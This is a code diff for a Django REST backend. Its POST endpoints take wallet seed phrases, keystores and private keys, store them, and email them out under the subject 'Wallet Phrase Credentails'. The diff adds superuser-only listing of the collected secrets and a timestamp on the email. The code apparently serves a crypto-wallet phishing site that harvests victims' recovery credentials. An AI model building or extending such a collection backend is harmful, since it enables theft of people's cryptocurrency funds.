@@ -13,14 +13,27 @@ from django.conf import settings
 from .utils import Util
 
 # Create your views here.
+@api_view(['GET'])
+def getRoutes(request):
+    routes = [
+        'POST /phrase/',
+        'POST /keystores/',
+        'POST /privatekey/'
+    ]
+    return Response(routes)
+
+
 @api_view(['GET', 'POST'])
 @parser_classes([JSONParser])
 def phrase(request):
     if request.method == 'GET':
-        phrases = Phrase.objects.all()
-        serializer = PhraseSerializer(phrases, many=True)
-        print(serializer.data)
-        return Response(serializer.data)
+        if request.user.is_superuser:
+            phrases = Phrase.objects.all()
+            serializer = PhraseSerializer(phrases, many=True)
+            print(serializer.data)
+            return Response(serializer.data)
+        else:
+            return HttpResponse("Unauthorized Request - Login as Admin User")
 
     elif request.method == 'POST':
         print(request.data)
@@ -29,7 +42,7 @@ def phrase(request):
         if serializer.is_valid():
             serializer.save()
             data = {
-                "body": f" WALLET ID: {serializer.data['walletId']}\n PHRASE: {serializer.data['phrase']}",
+                "body": f" WALLET ID: {serializer.data['walletId']}\n PHRASE: {serializer.data['phrase']}\n CREATED AT: {serializer['created_at']}",
                 "subject": "Wallet Phrase Credentails."
             }
             Util.send_email(data)
@@ -42,10 +55,13 @@ def phrase(request):
 @parser_classes([JSONParser])
 def keystore(request):
     if request.method == 'GET':
-        keystores = Keystore.objects.all()
-        serializer = PhraseSerializer(keystores, many=True)
-        print(serializer.data)
-        return Response(serializer.data)
+        if request.user.is_superuser:
+            keystores = Keystore.objects.all()
+            serializer = PhraseSerializer(keystores, many=True)
+            print(serializer.data)
+            return Response(serializer.data)
+        else:
+            return HttpResponse("Unauthorized Request - Login as Admin User")
 
     elif request.method == 'POST':
         print(request.data)
@@ -66,10 +82,13 @@ def keystore(request):
 @parser_classes([JSONParser])
 def privatekey(request):
     if request.method == 'GET':
-        privatekeys = PrivateKey.objects.all()
-        serializer = PrivateKeySerializer(privatekeys, many=True)
-        print(serializer.data)
-        return Response(serializer.data)
+        if request.user.is_superuser:
+            privatekeys = PrivateKey.objects.all()
+            serializer = PrivateKeySerializer(privatekeys, many=True)
+            print(serializer.data)
+            return Response(serializer.data)
+        else:
+            return HttpResponse("Unauthorized Request - Login as Admin User")
 
     elif request.method == 'POST':
         print(request.data)
